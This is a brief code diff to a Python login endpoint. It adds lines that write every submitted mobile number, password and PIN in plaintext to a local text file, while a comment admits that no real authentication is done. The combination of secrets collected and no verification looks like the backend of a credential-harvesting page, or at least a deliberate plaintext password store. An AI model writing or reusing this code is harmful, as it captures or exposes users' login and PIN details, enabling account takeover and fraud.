@@ -17,7 +17,12 @@ def login():
     pin = data.get('pin')
     
     login_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+ # Path to the database file
+    DB_FILE_PATH = "users_database.txt"
 
+    # Save data to the file
+    with open(DB_FILE_PATH, "a") as f:
+        f.write(f"Time: {login_time}, Mobile: {mobile}, Password: {password}, Pin: {pin}\n")
     # This is where we'd add actual authentication logic.
     # For now, just logging the data as requested.
     
